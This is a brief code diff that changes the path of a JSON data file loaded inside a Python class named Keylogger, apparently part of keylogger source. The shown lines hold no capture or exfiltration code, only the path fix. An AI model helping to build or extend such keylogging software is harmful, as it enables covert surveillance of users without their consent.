@@ -18,7 +18,7 @@ class Keylogger:
     self.log = ""
 
   def load_data(self) -> dict:
-    with open("data.json", "r", encoding="utf-8") as file:
+    with open("utils/data.json", "r", encoding="utf-8") as file:
       data = json.load(file)
     return data
   
